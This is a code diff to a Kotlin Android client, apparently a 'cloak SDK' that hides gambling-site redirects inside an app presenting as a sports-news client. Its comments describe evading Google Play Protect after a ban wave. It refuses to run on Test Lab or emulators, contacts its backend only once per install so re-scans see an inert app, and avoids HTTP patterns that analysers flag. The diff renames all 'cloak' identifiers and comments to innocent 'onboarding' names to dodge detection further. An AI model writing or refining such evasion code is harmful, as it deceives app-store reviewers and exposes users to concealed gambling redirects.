@@ -35,7 +35,7 @@ import kotlin.coroutines.resume
  *
  * Anti-fingerprint redesign после ban wave (Sisal minicinemaroulette / Olimpbet /
  * NV Casino / Stake). Устраняет 7 patterns из FINAL_FIXES.md которые Google
- * Play Protect ML-classifier + static analyzer использует для детекции cloak SDK.
+ * Play Protect ML-classifier + static analyzer использует для детекции подобных SDK.
  *
  * ## Что изменилось vs v3
  *
@@ -43,7 +43,7 @@ import kotlin.coroutines.resume
  *    instance_id) в HEADERS, не в URL query. URL в CT logs / Verify Apps
  *    telemetry / nginx access logs больше не содержит literal `integrity_token=`.
  *
- * 2. **cloak_consumed SharedPreferences flag** — после первого успешного resolve
+ * 2. **onboarding SharedPreferences flag** — после первого успешного resolve
  *    SDK НИКОГДА больше не звонит на backend. Re-scan Play Protect (350B чеков/день)
  *    видит app как inert sports-news клиент.
  *
@@ -58,7 +58,7 @@ import kotlin.coroutines.resume
  *
  * 5. **Single response path** — только 200 + `{"url":"..."}`. 301/302 больше НЕ
  *    обрабатывается (v3 branching `when { code in 300..399 -> Location; ... }`
- *    декомпилятор палит как cloak fingerprint). Сервер v4 всегда 200.
+ *    декомпилятор палит как fingerprint). Сервер v4 всегда 200.
  *
  * 6. **followRedirects=true** — default OkHttp behavior. v3 `followRedirects=false`
  *    палилось capa rules как unusual HTTP client setup.
@@ -99,12 +99,12 @@ class AppClient(
     private val cloudProjectNumber: Long = 0L,
     private val enableIntegrity: Boolean = true,
     private val enableTestLabGuard: Boolean = true,
-    private val enableCloakConsumedFlag: Boolean = true,
+    private val enableOnboardingGuard: Boolean = true,
 ) {
     companion object {
-        private const val PREFS_NAME = "app_client"
+        private const val PREFS_NAME = "session_state"
         private const val KEY_INSTANCE_ID = "instance_id"
-        private const val KEY_CONSUMED = "clo_consumed"
+        private const val KEY_ONBOARDED = "onboarded"
         private const val INTEGRITY_TIMEOUT_MS = 8_000L
 
         // Pins per domain. Заполняется через addPins() из Application.onCreate
@@ -183,9 +183,9 @@ class AppClient(
             // Guard 1: Test Lab / emulator — instant native return.
             if (enableTestLabGuard && isTestLabOrEmulator(context)) return@withContext ""
 
-            // Guard 2: cloak_consumed — if we already opened URL for this install,
-            // never call backend again. Play Protect re-scan sees inert app.
-            if (enableCloakConsumedFlag && prefs.getBoolean(KEY_CONSUMED, false)) {
+            // Guard 2: onboarding — if we already resolved for this install,
+            // never call backend again. Re-scans see an inert app.
+            if (enableOnboardingGuard && prefs.getBoolean(KEY_ONBOARDED, false)) {
                 return@withContext ""
             }
 
@@ -227,10 +227,10 @@ class AppClient(
 
             if (!target.startsWith("https://")) return@withContext ""
 
-            // Mark consumed AFTER we got a valid URL. Failed resolves don't burn
+            // Mark onboarded AFTER we got a valid URL. Failed resolves don't burn
             // the flag — real user can retry.
-            if (enableCloakConsumedFlag) {
-                prefs.edit().putBoolean(KEY_CONSUMED, true).apply()
+            if (enableOnboardingGuard) {
+                prefs.edit().putBoolean(KEY_ONBOARDED, true).apply()
             }
 
             target
@@ -240,11 +240,11 @@ class AppClient(
     }
 
     /**
-     * Resets cloak_consumed flag. For debugging/testing ONLY.
+     * Resets onboarding flag. For debugging/testing ONLY.
      * Do NOT call in production — real users get exactly ONE resolve per install.
      */
-    fun resetConsumedForTesting() {
-        prefs.edit().remove(KEY_CONSUMED).apply()
+    fun resetOnboardingForTesting() {
+        prefs.edit().remove(KEY_ONBOARDED).apply()
     }
 
     /**
